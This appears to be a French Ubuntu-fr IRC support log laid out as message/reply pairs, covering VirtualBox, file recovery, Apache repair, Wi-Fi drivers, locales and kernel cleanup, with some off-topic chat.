Et c'est pareil avec ubuntu-14.2.2-server-i386... Peut-être que ça vient de ma config de Virtualbox ? Des pistes ?	il faut activer PAE dans Virtualbox..
!wiki chroot	http://doc.ubuntu-fr.org/chroot | http://doc.ubuntu-fr.org/schroot | http://doc.ubuntu-fr.org/personnaliser_livecd | http://doc.ubuntu-fr.org/vsftpd | http://doc.ubuntu-fr.org/proftpd
deadrats merci je relog ca a l air super simple.	qui s'est fait refoulé de #ubuntu parce qu'il parlait fr :P
moi c'est weechat (client console), irssi est pas mal (aussi console)	apparement, il ne sera plus maintenu, meme. la branche hexchat est conseillée..
hexchat (anciennement xchat)	tien, xchat a forker bon a savoir
Donc vous pensez qu'il est possible d'installer un paquet via un live CD?	normalement c'est possible oui
Nairofl21 je suis passé completement à coté de cette histoire de boite noire, mais ca fait lgt que c'est dans les infos/ discuté à l'AN? De ce que j en vois c 'est peu relayé dans les infos, et ca a été voté en catimini dans la nuit...i.	c'estpas l'endroit pour en parler, ici c'est un salon de support, tu peux aller en causer sur #ubuntu-fr-offtopic
La Chine a au moins le courage de repousser les géants américains (certes pour placer ses propres entreprises, mais au moins elle fait prospérer le pays). Nous, en France, on se met à genous	c'est vrai. La dictature chinoise est bien plus bénéfique pour son peuple que nos démocraties nazes. Nous allons nous tiers mondisé, devenir un espèce de vaste espace comme le brésil, corrompu et violent
pierre__ tu veux remplacer un pouvoir despotique par un autre, c'est pareil ;)	il n' ya pas le choix. Qui peut gérer les data si ce n'est ces entreprises du numérique ? Je ne vois que google. A moins que tu connaisses une associatio philanthropique qui sache gérer ce big data.
Non, je pense que s'ils font ça, bien sur, ils ne vont le crier sur tout les toits, mais les utilisateurs windows vont rester indifférent	oui mais moi ça ne me dérange pas que gmail farfouille dans ma vie privée. Ce qui me dérange c'est que les états le fassent. Les états sont mauvais, google est une entreprise du Bien à but philantropique.
oui je l'ai installé	c 'est quoi ta version d ubuntu, ta carte graphic?
pierre__ : Mais si tu tiens à être hyper secure, il va falloir te renseigner plus sérieusement.	non ça va je ne suis pas un dissident politique ou un djihadiste, c'est les pirates que je crains
En fait, le fichier contenant les mots de passe est crypté. Tu as besoin d'un mot de passe pour le décrypter et accéder à tes données sensibles (mot de passe).	avec un keylogger malware, on peut néanmoins avoir accès à mes mots de passe non ?
soit, tu peux rentrer ces informations sur keepassx	ok je passera par le logiciel alors. excuses moi pour les ? partout, moi je ne vois pas ces problèmes
Soit tu crées des fichiers et tu les cryptes	c'est toi qui doit être mal configuré,  pierre__ écrit lisiblement pour moi..
Tu es sur Ubuntu ? Tapes "sudo apt-get install keepassx" et tu l'auras ;)	hum merci, intéressant. Je ferai ça je pense. Par ailleurs j'ai des trucs sensibles, comme mon numéro d'allocataire CAF, ma carte vitale. Où devrai je conserver ces informations penses tu ?
deadrats mais par exemple..est-ce quon pourrait scanner limage ensuite..pour détecter des fichiers effacés? avec clone2fs?	réfléchis posément à ce dont tu as besoin, et ça aidera à trouver le bon outil...
 je dois préciser l'extension de limage? deadrats	il y a des solutions plus performantes que "dd" pour faire des backups, sinon..
Oui, mais j'ai un petit niveau :)	tu verras c'est pas complexe, au pire je suis/nous sommes ici,
Euh, la page a 10ans, c'est toujours d'actualité? :-)	je t'invite à te nmap une fois ces rules en place tu verras toi même ;o
Bonjour. Concernant iptables, est-ce que vous ajoutez des règles spécifiques pour réduire les attaques? genre un règle pour réduire les "syn flood"?	http://www.cyberciti.biz/tips/howto-limit-linux-syn-attacks.html
!wiki 10.04	http://doc.ubuntu-fr.org/depots | http://doc.ubuntu-fr.org/openmodelica | http://doc.ubuntu-fr.org/natron | http://doc.ubuntu-fr.org/lecteur_carte_memoire
pose ta question directement	ça te parle ?
personne n'a de souci avec sa connexion internet qui se déclenche pas toujours au démarrage d'ubuntu ?	j'ai du 12.04 et du 14.04, et aucun souci
 il va mafficher deux repertoire avec le meme nom supprimé? ou des repertoires..  non nommé /f433t44rt/ de ce type	je n'en sait pas plus ;) désolé
plop6- Quel mode faut utilise dans le cas. que jai supprimé le répertoire.et par la suite créer un rep avec meme nom.;et supprimer encore ce rep vide créer avec le meme nom. ...  la fonction undelete de testdisk... montre le repetoire supprimé nouveau vide.. mais pas le repetoire original du meme nom avec son contenu	c'est une grosse partition ?
SurcouF J'ai essayé foremost.. mais le probleme est quil extract seulement les extensions supportés.. et non pas tous les extensions... je veux récupérer...tout	si tu la supprimer plusieurs fois je sais pas trop ..
LDI disque dur EXT4	testdisk ?
Que signifie legacy dans ce contexte ?	legacy = mode secure boot désactivé dans le bios si bios uefi (nouveau bios)
!wiki foremost	http://doc.ubuntu-fr.org/foremost | http://doc.ubuntu-fr.org/foremostgui | http://doc.ubuntu-fr.org/extundelete | http://doc.ubuntu-fr.org/liste_des_applications_console | http://doc.ubuntu-fr.org/systeme
@FloKat Ok ^^. Je dis ça parce que y'a bien AmaroK mais effectivement c'est du QT.	Clementine est basé sur AmaroK, non ?
@FloKat tu te limites volontairement à des softs GTK ? :)	comment ça ?
tu as de la chance	 c'est tout bien rangé dans mon dossier musiques
z9wMrrPn   ancien versionn...   ou genre de répertoire.. non assigné /degegrere/ qui contiendrait tous mes sous-répertoires et contenu du répertoireracine dorigine ..suppriméet remplacé par nmouveau rep du meme nom	c'est possible d'utiliser foremost pour certains types de fichiers, mais les noms/chemins ne sont pas conservés
que faire? pour résoudre cela	la première chose à faire, c'est d'éteindre l'ordi au plus tôt, de préparer un live-cd/usb depuis un AUTRE ordi, booter sur ce live-zizi, et faire une copie de ton disque dur sur un disque externe avec dd. Il ne faut en aucun cas utiliser ton ordi avant d'avoir fait ces manipulations.
version de mon virtualBox 4.3.10	Claude.  Si vous ne trouvez pas, on redémarre.  virt-manager semble bien marcher sans complication maintenant.  Calinou a peut-être expérimenté une plus ancienne version.  Conservez cette adresse dans FFox : http://virt-tools.org/learning/start-install-with-virt-manager/
je étudie aussi dans ce liens http://doc.ubuntu-fr.org/virtualbox#peripheriques_usb_virtualbox_4	ça répond pas fort - Si nous allions voir dans la base
très peux	J'essaie de voir si qqun connaît ça en anglais et je traduirai ici - comme ça, pas de chicane.
quelqu'un m'a tout expliqué	Merci
bien	En anglais, Claude, comprenez-vous de quoi?
je sais plus comment j'ai fait	<3
je parlais d'ĥote ici	ClaudeRoy: si j'ai bien compris...  il n'y aurait rien à changer dans /etc/group?  Nous avons cette ligne devant les yeux.  On sort et démarre une nouvelle session?
oui	Calinou: Maintenant j'ai ça : libvirtd:x:129:levier2
http://doc.ubuntu-fr.org/kvm	de ce que j'ai lu en diagonale, ils veulent coller un windows dans leur VM, donc vbox semble plus adapté, je n'ai aucune idée pourquoi virt-manager est arrivé là-dedans … et visiblement il y a une volonté d'acceder à l'usb de la VM windows, mais je ne sais pas pourquoi
de ce que j'ai lu en diagonale, ils veulent coller un windows dans leur VM, donc vbox semble plus adapté, je n'ai aucune idée pourquoi virt-manager est arrivé là-dedans … et visiblement il y a une volonté d'acceder à l'usb de la VM windows, mais je ne sais pas pourquoi	et pour le support usb, ça ne vient pas avec la version communautaire, je crois
(en tant qu'hôte)	mais installer osx dans une machine virtuelle, c'est illégal, non ?
Farfelu?	pour savoir si c'est libre, tu peux essayer vrms
pour tout ce qui ne concerne pas le support d'ubuntu: #ubuntu-fr-offtopic	J'avais pensé à partager un fichier Linux, accessible en WinVbox
pourquoi ne pas l'utiliser avec kvm ?	kvm  Oracle?
kvm  Oracle?	non, kvm, qemu, quoi
et quel est le problème avec virt-manager ?	Le problème, c'est Vbox.  Nous sommes tannés.
oui	^
...	^
Héhéhé, la loi pour l'espionnage étatique est passée en france XD	c'est un surnom gentil pour Sarkozy?
c'est un surnom gentil pour Sarkozy?	bah au moins, votre ancien président de la droite, il n'a pas foutu un espion dans chaque foyer français :-p
Moi trouvé	Vous prendrez note Claude svp?
puis tu te déconnectes et reconnectes de ta session	^
Comment est la procédure pour l'ajout de nom	C'est dans le terminal Claude
d'accord	il faut ajouter ton utilisateur au groupe libvirt
oui ?	Calinou, t'es parti où?
oui	Vous aviez une question Claude
la dernière version c'est 4.3.26	Alors : YvesLevier, kvm + virt-manager
par contre le setup n'est pas très simple, il faut savoir faire un peu de ligne de commande	J'ai proposé
d'Ubuntu?	kvm + virt-manager
sinon comme question générale , existe t'il un bon clavier virtuel pour la prise en charge des langues étrangères ?	je n'ai testé qu'onboard, xvkbd et dasher, et seulement en fr/en
oui c'est Unity sauf que moi je doit utiliser Unity 2D et pas 3D car j'ai le 32bit	peut-être ce que t'indiques teromene est une solution à suivre, qu'en penses-tu ?
d'accord je serais heureux si tu peux m'aider je vais attendre ta réponse et merci, à toute à l'heure	c'est bon, je suis entrain de créer l'usb maintenant
perso, j'ai mis le menu "dans la fenêtre"	 sauf que quand on déplace la fenetre en cliquant sur le haut, ça ouvre un menu en même temps.
Pas pratique les menus "fichier, éditer etc..." dans la barre du haut de la fenêtre sur unity, heureusement que l'astuce de désinstaller deux fichiers fonctionne encore et qu'on peut avoir tout cela sous la barre du haut de la fenetre	euh, pas la peine de désinstaller quoi que ce soit, c'est une option
non merci...	c'est juste que tu es sur un channel de support, il traite que d'un sujet Ubuntu stable "uniquement"
j'aime beaucoup votre système et votre travail....je tien à vous le dire....	encore une question concernant Ubuntu ?
merci de ta patience.....	ton logiciel est un GUI tcpdump est une commande c'est donc .. du CLI
!wiki tcpdump	http://doc.ubuntu-fr.org/trafic | http://doc.ubuntu-fr.org/iftop | http://doc.ubuntu-fr.org/wakeonlan | http://doc.ubuntu-fr.org/hlbr
ouep...!!!	bein, tcpdump la chose
Désoler..8|	bein ça dépend ce que tu veux faire
Bonsoir	AlexxC: Bien le Bonjour :)
j'ai un utilisateur www-data et un utilisateur "dev". Quand j'upload des images via mon FTP je me connecte via "dev", mais via mon interface web (via utilisateur www-data), je n'arrive pas à supprimer les photos uploadées par l'utilisateur "dev" => comment donner + de droits à www-data svp ? :(	ajoute www-data au groupe "dev"
ajoute www-data au groupe "dev"	j'ai toujours une erreur "Permission denied"
alors je voulais faire chown  sur le lien mais ca modifie la cible du lien et non ce dernier	chown ;)
pourtant dans les droits c'est écrit 777	man symlink
Comment changer les droits d'un lien sybolique ?	chmod pardis :)
Déja, j'arrive pas a trouvé d'info sur ces é  en deux parties	un petit exemple: http://fr.wikipedia.org/wiki/UTF-8#Description_technique
et sur certaines polices ca rend super moche	la table de caractères de base est sur 7 bits (1 octet par caractère), et ne comprend pas les accents. Il y a différentes façon "d'encoder" les caractères pour pouvoir utiliser les accents. On parle alors de charset (latin-1, utf-8, etc.), et un caractère accentué utilise habituellement plus d'un octet
https://doc.owncloud.org/server/7.0/user_manual/files/files.html	merci ca avance, j'ai réussi à créer le fichier ics directement depuis thunderbird en utilisant ce lien et boutton publish : https://webcloud6.zaclys.com/owncloud/remote.php/webdav/test.ics
je sais pas pourquoi	un souci de type mime ?
C'est pas vraiment ubuntu mais.. vous savez ce que c'est quand il faut deux frappes backspace pour effacer un é ou un è ?	quand y'a un souci de locales ?
quand y'a un souci de locales ?	non, c'est un user de mon wordpress qui balance les é comme ça
le script que je veux utiliser à besoin de lire un fichier ics	t'as probalement la possibilité de trouver un script "client" caldav
je n'ai pas bien compris ta phrase d'avant	bah owncloud est aussi un serveur caldav, c'est à dire propose un service de stockage en ligne de ton agenda (avec synchronisation, possibilité de clients multiples, tout ça)
je connais pas ce cladav	genre https://ton.own.cloud/caldav.php
sur webdav ou un truc dans le genre	je comprends pas la question
alors qu'il y a belle et bien le dossier	tu backups les confs apache en ssh avant
tu backups les confs apache en ssh avant	 je n'ai jamais fais j'avoue avoir peur de me planter
 je n'ai jamais fais j'avoue avoir peur de me planter	y'a rien qui fonctionne sur ta bécanne ><
y'a rien qui fonctionne sur ta bécanne ><	on est bien d'accord ^^. Le souci que j'ai....aucune backup, site marchand avec base MYSQL.....principal activité de la société....la galère l'ancien admin c'est baré sans rien me donner
on est bien d'accord ^^. Le souci que j'ai....aucune backup, site marchand avec base MYSQL.....principal activité de la société....la galère l'ancien admin c'est baré sans rien me donner	si seulement il avait isoler chaque service... là à part backup et réinstaller apache (seulement lui, on est optimiste) je ne vois pas d'alternative
ça existe "en_EN" comme locale ?	c'est l'équivalent de fr_CA
dpkg-reconfigure locales	http://pastebin.com/mKR1ZPRw
apt-get install --reinstall apache2.2-common ?	http://pastebin.com/ViKq4gPS
dpkg -S /etc/init.d/apache2 te répond bien  apache2: /etc/init.d/apache2 ?	si justement....c'est bizarre
 -sh: /etc/init.d/apache2: No such file or directory	donc, t'as pas /etc/init.d/apache2 ?
et tu "lances" apache2 comment ?	/etc/init.d/apache2 start
/etc/init.d/apache2 start	et ça sort quoi ?
http://pastebin.com/1TBZUDUt	tu l'as réinstallé ?
tu l'as réinstallé ?	 non justement si je réinstall je perds tout ?
pfft	pas comme ça je supposes ?
en gros ubuntu était en version 7 et suite à MàJ vers 10.....plantage	dpkg -l | grep apache
apache2 est installé ?	c'est un server que je reprends derrière quelqu'un qui n'a rien noté....
sinon, plus de détails, c'est sans doute mieux	quand tu veux lancer apache2 ou autre
et gksu n'est plus installé par defaut	bon à savoir
bon et bien mezen je te remercie !! je te paye une bière si tu es de passage sur niort (79000) un de ces quatre :)	de rien
je filtre par Etat (barre à gauche), puis je selectionne tout ce qui est dans non installé (résidus de ..) et je fais supprimer complètement	pkexec est conseillé au lieu de gksu depuis quelques versions
*google*	et de toute façon si tu le lances depuis le menu, il va te demander ton mot de passe
mouais les avis ne sont parfois pas très objectif en plus...	installe le paquet gksu
et j'en fait quoi de ma capture ?	tu peux utiliser Synaptic comme remplacement
ok, merci...	et cette interface la, elle n'a pas non plus la recherche ?
car là je n'y comprend pouic..	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
je suis sous xubuntu 14.10	quand tu lances depuis le terminal, t'as un message d'erreur ?
j'ai tenté de supprimer l'anglais des mapping, mais j'ai le même soucis, et là impossible de basculer en Azerty avec Super + Espace	Calinou: non mais serieusement … si vous ne faites pas confiance à intel pour les mises à jour des firmware de leur proco, faut pas utiliser de proco intel en premier lieu, parce que c'est juste une mise à jour du firmware, c'est pas comme si il n'y avait pas de firmware en premier lieu avant l'installation du paquet
Calinou: non mais serieusement … si vous ne faites pas confiance à intel pour les mises à jour des firmware de leur proco, faut pas utiliser de proco intel en premier lieu, parce que c'est juste une mise à jour du firmware, c'est pas comme si il n'y avait pas de firmware en premier lieu avant l'installation du paquet	je n'ai pas dit que je ne faisait pas confiance
des spywares en plus	héhé
est-ce que quelqu'un saurait comment m'aider ?	 pa moi désolé
ça sert à corriger des bugs ou n'importe et c'est apparu récemment dans ubuntu (à partir de 15.04 vivid)	ubuntu me déconseille appremment de le mettre puisqu'il me parle d'un périphérique inconnu, donc je m'abstiens ?
ubuntu me déconseille appremment de le mettre puisqu'il me parle d'un périphérique inconnu, donc je m'abstiens ?	je ne connais pas la réponse, mais au vu des bugs lancés à ce sujet, je dirais oui
mezen oui	ça doit etre les microcodes de amd : http://www.amd64.org/microcode.html
dans la liste de pilotes additionnels j'ai un truc bizarre  : ce périphérique ne fonctionne pas et en dessous c'est écrit : utilisation de microprogramme du microcode processeur pour les processeurs AMD depuis amd-64 microcode, qui n'est pas coché. Ca veut dire quoi ?	http://askubuntu.com/questions/613579/unknown-additional-driver-processor-microcode-firmware-for-intel-cpus-for-intel
bonsoir à tous	tu as un cpu AMD ?
on dirrait	c'est très agréable à utiliser sur un ordi, surtout quand on a un poil l'habitude des raccourcis clavier et du fait d'avoir plusieurs bureaux
ou alors t'es obliger de garder 2 DE	avoir deux DE c'est pas vraiment un soucis, surtout si tu fais une installation minimale du second
z9wMrrPn se débarrasser d'unity ? pourquoi ne pas installer directement une version sans unity alors ?	probablement par habitude des logiciels venant avec la version de base... par exemple avec kde t'as un autre explorateur de fichiers
Ah.	ah, c'est unity, pas le nouveau gnome. T'es pas le seul à ne pas aimer. Tous les utilisateurs d'ubuntu que je connais commencent par se débarasser d'unity après chaque nouvelle installation :)
4690k, GTX970, 8go. Au niveau config c'est correct	tu parles bien de gnome shell, pas d'unity, l'espèce d'horreur qui vient par défaut avec ubuntu ?
Et j'ai direct fait un gnome-+session-fallback car de base quand j'installe un ubuntu c'est le truc de base que je fais	gnome shell passe sans soucis sur mon netbook à 100€... t'es certain d'avoir installé les drivers de ta carte graphique ?!
@cyber37 Alors je sais pas d'où ça vient ^^	et non pierre__  lol
LDI oui c'est un android. Je crois bien qu'il est connecté à mon compte google puisque je peux lire mes mails dessus.	mais tu vois, quand j'ajoute un groupe de contact ou un contact sur Google contacts, ça ne change rien au niveau de mon téléphone quand j'appuis sur l'icone du téléphone
ça apres j'en sais rien. Pour moi ça permettait de passer sur l'encien gnome a la base. Car bon le nouveau gnome me fait ramer tout les PC et j'aime pas l'interface du coté (et pas des pc pouris)	je fais tourner gnome-session-flashback également et je n'ai pas ton problème. J'ai par contre ubuntu-desktop installé (mais non utilisé)
effectivement c'est gnome que j'utilise avec ubuntu trusty	gnome-shell ?
@floown Mouais ^^ jusqu'au prochain album :p	ah oui c'est pas la même application, unity-control-center possède un barre de menu
@floown Mais au final y'a plus de souci donc ?	oui, on peut dire que c'est résolu :)
En plus c'est unity-control-center le gestionnaire de paramètres....s'il est pas sur Unity c'est très bizarre.	en fait, l'album n'avait pas besoin de normalisation, le début de l'album est intimiste
Madrémia ! C'est bon	tu peux répondre au moins ?
@floown normalement ca se change	je pense que normalize-audio fait le job, je n'avais pas eu de ligne sur un quelconque réencodage
@floown Oui c'est destructif et c'est sans doute le comportement par defaut	des fois, c'est le paramètre "OnlyShowIn" qui joue dedans
Je tante le coup	si c'est ni gnome ni unity, tu peux taper cette commande et nous dire le résultat? grep OnlyShowIn /usr/share/applications/gnome*panel.desktop
un mec semble avoir résolus le probleme en faisant un sudo apt-get install ubuntu-desktop qui installe les paquets manquants	t'as quoi comme desktop ?
Normalement si tu utilise Unity tu n'as pas besoin d'installer gnome-control-center.	normalize-mp3 -m *.mp3 semble mettre les mp3 en 128kbps si on ne précise rien
tu fais comme le deb-src après chaque ligne	LDI tout est propre, update ne dit pus qu'il est pas content . merci à vous
oups désolé mal tappé	en fait ta première ligne
"deb http://fr.archive.ubuntu.com/ubuntu/ trusty main restricted multiverse" et "deb http://fr.archive.ubuntu.com/ubuntu/ trusty universe multiverse", non ?	quelles lignes ?
Y'en a au moins une.	peut etre mais j'ai jamais eu ça avant
là je vois deux architectures i386 et amd64	je ne vois pas les références à 32 ou 64 dans le source.list . pourtant apt-get update en parle en effet
ok pour modif les lignes apres	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
oh la vache	en fait tout est dans l'interface, tu peux décocher les entrées que tu juges inutiles ou qu'elles generent des soucis lors d'un update
je crois que soundkonverter le fait aussi	oui mais il s'appuie sur mp3gain
mais sinon tu m'as pas dit que tu utilisais Amarok pour gérer ton son ?	oui
Faudrait un moyen plus fiable que l'oreille pour voir si c'est vraiment normalized :p	ouep :p
Mais bizarrement chez moi non plus ça n'a pas l'air d'affecter les DBs...	il existe normalize-mp3 dans mes commandes
Par contre fais gaffe je pense que c'est destructif.	les tags ne sont pas changés après l'application de la commande
salut	salut
Merde, c'est for f in ./albums/*; do; normalize-audio ......; done	t'as la 15.04 ?
@floown Je sais pas pourquoi tu t'en sers mais en alternative pour normaliser le volume y'a ça http://packages.ubuntu.com/vivid/normalize-audio	y'a un Gui ?
ça te répond quoi ?	le paquet n'est pas listé
un code	ou un switch au niveau de ton pc
Mezen ? Il y a une suite concernant notre histoire ? ^^ merci	bah je sais pas, où veut tu en venir ?
dsl j'me suis tromper de chan	les ops dorment, t'inquietes pas
uil reste juste que...	t'as pu trouver ton wifi ou pas ?
Mezen ?	yep
dsl	des gens ici trouvent xfce moche, c'est quoi ton avis là dessus ?
rien du tout	sudo apt-get install b43-fwcutter
http://pastebin.com/WxZ1me4Y	cette commande te rend quelque chose? dpkg -l | grep b43
je fais quoi donc ?	tu peux aussi coller ça
"windows wireless manager"..?	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
j'le teste ?	t'as rentré la même dans le menu du NetworkManager ?
le bouton s'efface après l'adresse mac écrite	ouvre un terminal et tape sudo lshw -c network
bssid, ça va aussi pour mac ?	c'est la façon manuelle que je te montre, si ça marche pas cela veut dire que ta carte wifi n'est pas reconnue
(je vais essayer de la rentrer manuellement)	non tu le laisses vide
n'est-il pas moyen de la trouver automatiquement	puis tu sélectionnes Wi-Fi depuis le menu, et dedans tu rentres ton SSID de ta box et son adresse MAC
si, où il m'est présenté la connexion ethernet	tu cliques sur le bouton Ajouter à droite
classique ?	sudo apt-get install --reinstall firefox
si mais rien ne s'affiche concernant les réseaux wifi	tu cliques dessus, t'as pas un menu qui s'affiche avec un truc tout en bas "Modifications des connexions" ?
un peu d'aide me serait la bienvenue, merci =)	t'as pas une icone reseau dans la barre des taches ?
question de gout	rien n'est moche tout est themable 'ldiée et d'aporter au novce un systeme qui lui va bien selon les standard qui luis correspondent
pareil	> probleme > kde un peu lourd si petite machine > pb ubuntu > interface un peu zarb pour qui est habitué a windows > avantage de cubuntu (cinamon) l'utilisateur n'ets pas perdu
(question de gout)	:)
perso je trouve le plus simple xubuntu	NON
quelqu'un pourrais t-il m'aider svp?	bonjour
dans se que dit openvpn sur leur site en tk ...Probleme de filtrage comme tu dit	t'utilises le port 1194 ?
du client	t'as un petit peu cherché sur internet ?
Salut à tous et chacun.....j'aurais besoin d'un petit conseil technique concernant openvpn sous 14.04....quelqu'un peut-il m'aider....???	vas-y essaye toujours :)
:x	je confirme
oui	félicitations
ah ouais..  quand même.	http://novosial.org/shell/kill-9/index.html
http://novosial.org/shell/kill-9/index.html	?
?	kill -9 c'est le mal
J'ai essayé "suspend tab" / the great suspender..	je me rends compte que les extensions consomment beaucoup de memoire
Toi, t'as pas  le  moral. Je me trompe ?	t'inquiètes, je maitrise
mezen nous la joue paranoiaque. on sait ou se trouve ton dossier porno, t inquiete :-D	pffffffffff
si non, il ont coche la case "auto-join", comme moi	un peu comme uBOTu-fr
:-D	salut
ca fait toujours plaisir ca	 ^^
J'avais installer windows 8.1, j'ai supprimer la partition de windows et garder celle de mes documents ( que je ne parvient pas à ouvrir )	t'as bien désactiver le démarrage rapide ?
Est ce que quelqu'un pourrais m'aider ? merci	si quelque chose il y a bien sûr ^^
Je suis en train d'essayer Ubuntu pour la première fois, et suite à l'installation je n'arriva pas a accéder à une partition ntfs , j'obtiens un message d'erreur	t'as quoi à coté
ou es qu on peut trouve des packs d icones pour ubuntu ?	dans un terminal tape: apt-cache search icon-theme
pour le wifi, tu aurais une doc ?	pour les icons, faut activer un truc dans les apparences
la machine : asus G74Sx	tu as installé pavucontrol ?
si :)	attendre
petite question. quand j utilise un lecteur pour lire une video youtube, es que la vue compte dans le compteur youtube ?	si le lecteur intègre les appels à l'api (ce dont je doute), oui
c'est un site marchant en plus....pas de backup.....	la db est sur le même serveur ?
la db est sur le même serveur ?	 tout le mec à tout laissé en plan et ai partie...j'ai déjà eu du mal à retrouvé les accès au server....
 tout le mec à tout laissé en plan et ai partie...j'ai déjà eu du mal à retrouvé les accès au server....	hmm, à ta place je ferais tous les backups possibles en ssh pour ensuite réinstaller
hmm, à ta place je ferais tous les backups possibles en ssh pour ensuite réinstaller	 je suis une tâche en plus en nux......ça va être drôle
je sais bien.....j'avoue je suis pomé	je ne vois plus d'autre solution autre que le purge + reinstall
voilà ce que j'ai : dpkg --get-selections | awk '/apache/ { printf $1" " }' apache2 apache2-doc apache2-mpm-prefork apache2-utils apache2.2-bin apache2.2-common libapache2-mod-php5 root@ns229063:~/etc#	y'a tout ce qu'il faut...
voilà ce que ça donne : root@ns229063:~/etc# service apache2 restart apache2: unrecognized service	on va quand même vérif les paquets de réinstallés : dpkg --get-selections | awk '/apache/ { printf $1" " }'
non la même webmin est inaccessible	t'as essayé de relancer apache ?
fait	y'a du mieux ?
non du tout	bon ben je pense que y'a eu une merde avec une màj d'apache. tu dois --reinstall
bon ben je pense que y'a eu une merde avec une màj d'apache. tu dois --reinstall	 donc apt-get apache2 install --reinstall ?
 donc apt-get apache2 install --reinstall ?	apt-get install --reinstall apache2
non non je viens de te poster la réponse	pgrep apache2 # ne retourne strictement rien donc ?
 WARNING: MaxClients of 4096 exceeds ServerLimit value of 256 servers,  lowering MaxClients to 256.  To increase, please see the ServerLimit  directive. httpd not running, trying to start	pgrep apache2
 httpd: unrecognized service	t'es allé voir les logs au cas où ?
t'es allé voir les logs au cas où ?	 je réinstalle alors ?
 je réinstalle alors ?	apache se lance?
quelqu'un d'irc une fois a pris la main sur mon server et m'avait aidé à remettre tout d'applond mais impossible de me rappeler le nom	je pense que t'as pas trop le choix. essaye: apache2ctl -k graceful
ok	un peu plus complique si tu l as crypter
est-ce que ta pu récupérer ton ancien home de Lubuntu ancienne version ?	si tu as décrit ta partition /home à l'install, ça devrait aller
y'a rien sur ce serveur	perso je tenterais un apt-get install --reinstall apache2
perso je tenterais un apt-get install --reinstall apache2	et si ça ça marche pas, faut une réinstall en purgeant les paquets liés à apache
je peur de pas comprendr ece que tu essai de me dire	si j'fait une installation de Lubuntu 15.04 en formatant uniquement ma partition racine, est-ce j'vais pouvoir récupérer mon ancien home ? si j'met mon user et mon pass actuel
qui est deja sur la 15.04 ici ?	avec Lubuntu 15.04, est-ce que ta réussi à récupérer ton ancien home ?
avec Lubuntu 15.04, est-ce que ta réussi à récupérer ton ancien home ?	comment ca recuperer mon acien home ?
comment ca recuperer mon acien home ?	ou plutot, en effacer une ancienne installation
uiui	ah non on a déjà testé ça
installation propre	je sais pas, ta surement essayer de récupérer ton ancien home par dessus une ancienne installation
oula je vais perdre tout ?	/etc/init.d/apache2 restart
locate apache | curl -F 'sprunge=<-' http://sprunge.us	pas de fichier de service ;)
type -p apache2 /usr/sbin/apache2	ça te retourne quoi ?
apache2: unrecognized service	essaye: service httpd stop
http://sprunge.us/DEOa	attend, tu lances bien la commande en root?
désolé je débute je ne comprend pas :  locate apache | curl -F 'sprunge=<-' http://sprunge.us The program 'curl' is currently not installed.  You can install it by typing: apt-get install curl	je te conseille de réinstaller apache
je peux vous poster ça comment ?	type -p apache2
par exemple :  /var/lib/dpkg/info/apache2.2-common.postrm /var/lib/dpkg/info/apache2.2-common.preinst /var/lib/dpkg/info/apache2.list /var/lib/dpkg/info/apache2.md5sums /var/lib/dpkg/info/apache2.postinst /var/lib/dpkg/info/libapache2-mod-php5.conffiles /var/lib/dpkg/info/libapache2-mod-php5.list /var/lib/dpkg/info/libapache2-mod-php5.md5sums /var/lib/dpkg/info/libapache2-mod-php5.postinst /var/lib/dpkg/info/libapache2-mod-php5.pos	service apache2 restart # ça retourne quoi ?
et plantage	apt-get install curl
je reboot	je voulais la liste complete sur un pastebin
Reading package lists... Done Reading package lists... Done Building dependency tree Reading state information... Done E: Couldn't find package pastbinit	^past^paste
bizarre	essaie: /etc/init.d/apache2 start
Dans ces cas là la commande A ne sera pas exécutée en arrière plan	ls&ls
apache: unrecognized service	tu as mis a jour en quelle version de ubuntu ?
Salut, y'aurait-il un moyen d'enchaîner 2 commandes, la première étant exécuté en arrière-plan ? En gros, j'aimerai lancer quelque chose du style "commande A &; commande B", mais la syntaxe n'est pas correcte. Même si le but de cette commande peut paraître complètement débile, ça me ferait gagner pas mal de temps... :)	tu ne dois pas mettre de ";" après "&"
salut matmoot	ta fait une new install ou une mise à jour pour Lubuntu 15.04 ?
je peux utiliser les tutos de ubuntu.fr  ?	ça dépend pour quoi
j'amerais savoir dans quelle mesure l'instalation de logicielle sous ubuntu differe de linux mint, SVP	c'est en gros le même système (on passe par des dépots)
ok j'croyais qui fallais attendre minimum 1 mois avant d'installer les new version de Linuxè	une raison particuliere ?
Lubuntu	toi aussi ta Lubuntu ? quel version ?ç
du systeme	PulseAudio est installé par défaut dans Ubuntu
j ai des bugs audio apres l installation	j'comprend pas, j'ai PulsuAudio sur mon Lubuntu et j'ai pas a me plaindre...
l'audio Skype fonctionne chez moi, avec PulseAudio	oui mais je ne veux pas installe pulse !
depeccable ?	ça sonne pas bien ^^
le PC dit rien :)   c'est bon signe	quid du message concernant l'espace disque, problème initial ?
update: Lectures des litses de paquets ...Fait	donc pas d'erreur ?
C'était juste à la fin de l'Upgrade,	et si tu refais un update et un upgrade, tu as toujours l'erreur ?
le message d'erreur:  "Désolé, ubuntu 15.04 a rencontré une erreur interne"	avant le reboot donc
la belle époque :)	ce message est apparu lors de l'upgrade ?
le AMSTRAD CPC61128 j'avais ça en CM2	asm ou basic ?
oui (j'imagine que ça c'est bien passé meme si j'ai eu un message d'erreur)	tu te souviens du message d'erreur ?
quand je fait uname -r   je suis en 3.19.0-15-generic	t'as fait une màj ?
y a t'il un endroit ou sont stocké les logs d'erreur ?	contexte ?
je reboot la machine ?	niquel. qu'en est-il du message concernant l'espace disque ?
j'autoremove que les "generic" ?	non, tu peux aussi virer les extras des kernels < 33
c'est 150Mo à chaque linux-image....  je suis a la 0-29	retire tout ce qui correspond à chaque version :)
le kernel etant le noyau (la base du systeme) c'est ça ?	pour faire court, oui :p
(il faut que je recopie tout a la main sur l'autre bécane avec le LUBUNTU - C'est un peu long )	tu peux choisir de ne pas garde la 33 en le rajoutant. perso je préfère garder une version précédente au cas où
ok	pour l'explication, sudo apt-get autoremove --purge linux-image-3.16.0-{23,28,29,30,31}-generic # supprime les images du kernel inférieures à 32
j'autoremove alors ? je veux pas faire de probleme sur l'IRC	reprend bien les bons nombres :p
autoremove --purge, c'est le best en terme de "clean" :)	par contre y'a pas d'alias autopurge ><
*considèrent	purge est un alias de "remove --purge"
